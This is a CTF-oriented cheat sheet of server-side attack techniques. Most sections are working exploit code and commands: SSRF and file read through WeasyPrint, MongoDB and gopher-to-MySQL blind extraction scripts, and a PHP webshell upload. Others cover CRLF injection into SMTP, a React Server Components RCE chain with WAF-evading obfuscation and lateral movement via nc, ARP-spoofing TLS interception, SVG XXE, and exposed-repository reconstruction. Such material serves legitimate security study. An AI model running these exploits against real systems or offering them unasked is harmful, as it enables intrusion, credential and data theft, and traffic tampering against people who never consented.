# Server-Side Advanced Techniques (Part 4)

## Table of Contents
- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
- [AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)](#amqptls-interception-via-sslsplit--arpspoof-tamuctf-2019)
- [CairoSVG XXE via Oversized width= (BSidesSF 2019)](#cairosvg-xxe-via-oversized-width-bsidessf-2019)
- [Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)](#bazaar-bzr-repository-reconstruction-via-bzr-check-loop-stem-ctf-2019)

See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool DjVu, Go rune/byte, ZIP symlink, path traversal bypasses, Nginx alias, Unicode homoglyph, Ruby Regexp.escape, /dev/fd, Flask/Werkzeug debug, XXE DTD filter bypass, %2f bypass). See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2. See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3.

---

## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.

### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.

**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`

**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.

---

## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.

**Injection payload:**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
This breaks the regex context and injects a boolean condition. Result count reveals truth value.

**Binary search extraction:**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.

---

## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.

**Attack chain:**
1. Upload file containing: `{% include "/flag.txt" %}`
2. Get upload ID from session cookie (base64 decode, extract hex ID)
3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI payloads:**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.

---

## ZIP Upload with PHP Webshell (Nullcon 2026)

**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.

**Exploit:**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**Variants:**
- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
- Race condition: file may be deleted after extraction -- access immediately

---

## basename() Bypass for Hidden Files (Nullcon 2026)

**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.

**Exploit:**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.

---

## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)

**Pattern:** wget versions before 1.17.1 (notably 1.14, common on CentOS 7) do not sanitize CRLF characters (`%0d%0a`) in the HTTP Host header. When an SSRF allows controlling the URL that wget fetches, CRLF injection into the hostname allows injecting arbitrary protocol commands. Targeting an internal SMTP server on port 25 enables sending arbitrary emails.

```text
# CRLF-injected URL targeting internal SMTP on port 25:
# Key: the port :25/ must come at the END to avoid "Bad port number" errors
http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
```

```python
import requests
import urllib.parse

# Build the CRLF-injected SMTP conversation
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: give me flag",
    "",
    "Send me the flag please",
    ".",
])

# URL-encode the SMTP commands for injection into the hostname
encoded = urllib.parse.quote(smtp_commands, safe='')

# Port must be at the end to avoid wget "Bad port number" error
ssrf_url = f"http://127.0.0.1{encoded}:25/"

# Trigger the SSRF
requests.post("http://target/fetch", data={"url": ssrf_url})
# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
# The SMTP server processes the injected commands and delivers the email
```

**Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [server-side.md](server-side.md#ssrf) for other SSRF techniques.

---

## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)

**Pattern:** When SSRF allows the `gopher://` protocol, craft raw MySQL protocol packets to communicate with a local MySQL instance that uses passwordless authentication (common in CTF setups). Combine with time-based blind SQLi via `SLEEP()` to extract data.

```python
import urllib.parse
import requests
import time

# Step 1: Capture a real MySQL session with tcpdump
# tcpdump -i lo port 3306 -w mysql.pcap
# Connect to MySQL normally: mysql -u root
# Execute a simple query, then disconnect
# Extract the client auth packet and query packet bytes from the pcap

# Step 2: Build the gopher payload
# MySQL auth packet (handshake response) - extract from pcap
auth_packet = bytearray([
    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
    0x85, 0xa6, 0x03, 0x00,  # client capabilities
    # ... remaining auth packet bytes from tcpdump capture
])

# MySQL query packet
def build_query_packet(sql):
    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
    length = len(payload)
    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
    header = length.to_bytes(3, 'little') + b'\x00'
    return header + payload

# Step 3: Time-based blind extraction
flag = ""
for pos in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
        query_packet = build_query_packet(query)

        # Combine auth + query, URL-encode for gopher
        raw_data = bytes(auth_packet) + bytes(query_packet)
        encoded = urllib.parse.quote(raw_data, safe='')

        # Double-encode if the SSRF handler URL-decodes once
        double_encoded = urllib.parse.quote(encoded, safe='')

        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"

        start = time.time()
        requests.get("http://target/fetch", params={"url": gopher_url})
        elapsed = time.time() - start

        if elapsed > 3.0:
            flag += char
            print(f"Flag so far: {flag}")
            break

print(f"Final flag: {flag}")
```

**Key insight:** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also [sql-injection.md](sql-injection.md) for SQL injection techniques.

---

## React Server Components Flight Protocol RCE (Ehax 2026)

**Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).

### Step 1 — Identify RSC via HTTP headers

Intercept form submissions in the Network tab. RSC-specific headers:
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

Confirm the server function name in client JS bundles:
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

### Step 2 — Exploit Flight deserialization for RCE

Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.

Request structure:
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

### Step 3 — Exfiltrate data via NEXT_REDIRECT

Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

The server responds with:
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

Example — confirm RCE with `process.pid`:
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

### Step 4 — Bypass WAF keyword filters

When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):

1. **String concatenation:**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **Hex encoding:**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **Combined in payload:**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

### Step 5 — Post-RCE enumeration

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

### Step 6 — Lateral movement to internal services

After discovering internal services (e.g., from hint files):
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.

**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.

**Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.

---

## AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)

**Pattern:** A web shim posts a JSON job `{"user": "alice", "code": "..."}` to an internal RabbitMQ broker on `5671/tcp` (AMQPS). Clients almost never pin certificates, so ARP-spoofing both hosts onto the attacker and terminating TLS with sslsplit yields plaintext AMQP frames you can log and rewrite (swap `"alice"` for `"root"` mid-stream to escalate privileges).

```bash
# 1. Sit between the web server and the broker (both ways)
arpspoof -i eth0 -t 172.30.0.2 172.30.0.4 &
arpspoof -i eth0 -t 172.30.0.4 172.30.0.2 &

# 2. Redirect the AMQP port into sslsplit
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5671 -j REDIRECT --to-ports 1234
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
mkdir /tmp/sslsplit logdir
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 1234
cat logdir/*    # shows plaintext AMQP frames with the JSON body

# 3. For on-the-fly rewriting, patch mitmproxy's raw TCP layer:
#    mitmproxy/proxy/protocol/rawtcp.py, RawTCPLayer._handle_server_message():
#        x = buf[:size].tobytes().replace(b'"user": "alice",', b'"user": "root", ')
#        tcp_message = tcp.TCPMessage(dst == server, x)
mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
          --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
```

**Key insight:** Clients without certificate pinning accept any CA-signed cert; sslsplit terminates TLS and forwards plaintext to its log, so any TLS-wrapped protocol (AMQP, IRC, MQTT, LDAPS, custom binary) becomes observable and — with a trivial mitmproxy patch — modifiable. Burp and mitmproxy focus on HTTPS; for arbitrary protocols, reach for sslsplit/sslsniff plus a pinhole in the TCP layer.

**References:** TAMUctf 2019 — Homework Help, writeup 13477

---

## CairoSVG XXE via Oversized width= (BSidesSF 2019)

**Pattern:** A web service renders user-supplied SVG to PNG with CairoSVG. CairoSVG (and librsvg/ImageMagick/rsvg-convert) resolves XML `DOCTYPE` entities before rasterising, so an XXE entity referenced inside `<text>` is drawn into the PNG. The gotcha: the rendered pixels have to fit the string — for a large file such as `/proc/self/status`, bump `width` up to ~20000 (max ~34000 before the server times out during rasterisation) so the text does not get clipped.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xx SYSTEM "file:///proc/self/status">]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx;; test</text>
</svg>
```

Upload, download the PNG, and read the flag off the image (eyeball or OCR). When hunting the flag path, dump `/proc/self/status` first to find the PID, then probe `/proc/<pid>/cwd/flag.txt`, `/proc/<pid>/cmdline`, and `/proc/<pid>/environ`. If the first pass clips (e.g. width=3000), re-render wider — BSidesSF 2019 SVGMagic landed the flag only at `width="3000"` because the target path was short.

**Key insight:** SVG renderers that honour DOCTYPE + ENTITY expansion are XXE-vulnerable just like any XML parser; enlarge `width` to fit large file contents into the rendered image, and remember the output channel is *pixels*, not text — `grep` the PNG for the flag after OCR (e.g. `tesseract img.png -`) or open it manually.

**References:** BSidesSF 2019 CTF — SVGMagic (PNGSVG), writeup 13711. See also the svglib variant in [server-side-2.md](server-side-2.md).

---

## Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)

**Pattern:** Web server exposes `/.bzr/` (HTTP 403 on the index, 200 on files). Bazaar stores history as a handful of index + pack files; `bzr check` tolerates partial repos and, on missing data, names the expected path in its error message. A loop that reads each error and `wget`s the corresponding file rebuilds the repository, after which `bzr revert` and `bzr diff` expose every committed revision — including secrets that were later removed.

```bash
# 1. Seed a local repo so bzr has a skeleton to work with
mkdir ctf && cd ctf && bzr init
echo foo > foo.txt && bzr add && bzr commit -m init && rm foo.txt

# 2. Replace the pointer files with copies from the victim
cd .bzr/branch     && rm last-revision && wget http://target/.bzr/branch/last-revision
cd ../checkout     && rm dirstate       && wget http://target/.bzr/checkout/dirstate
cd ../repository   && rm pack-names     && wget http://target/.bzr/repository/pack-names
cd ../../

# 3. Loop until bzr check stops complaining about missing indices/packs
while true; do
  OUT=$(bzr check 2>&1)
  [[ "$OUT" != *"No such file:"* ]] && break
  F=$(echo "$OUT" | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
  for EXT in cix iix rix six tix; do
    wget -P .bzr/repository/indices/ "http://target/.bzr/repository/indices/$F.$EXT"
  done
  wget -P .bzr/repository/packs/ "http://target/.bzr/repository/packs/$F.pack"
done
bzr revert

# 4. Mine every revision for interesting diffs
for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
```

**Key insight:** Exposed `.bzr/` (or `.git/`, `.hg/`, `.svn/`) directories leak full commit history; bzr is particularly friendly because it tolerates partial repos and reports the missing path verbatim, so a wget-in-a-loop solver finishes the job. Always diff revisions, not just `HEAD` — flags, wallet keys, and decryption keys are often *removed* in a later commit but still recoverable. Once the tree is reconstructed you can chain with challenges like STEM CTF "Medium is overrated", where revision N stores a base64 ciphertext and revision M stores the AES-ECB key.

**References:** STEM CTF Cyber Challenge 2019 — My First Blog & Medium is overrated, writeups 13380 and 13379
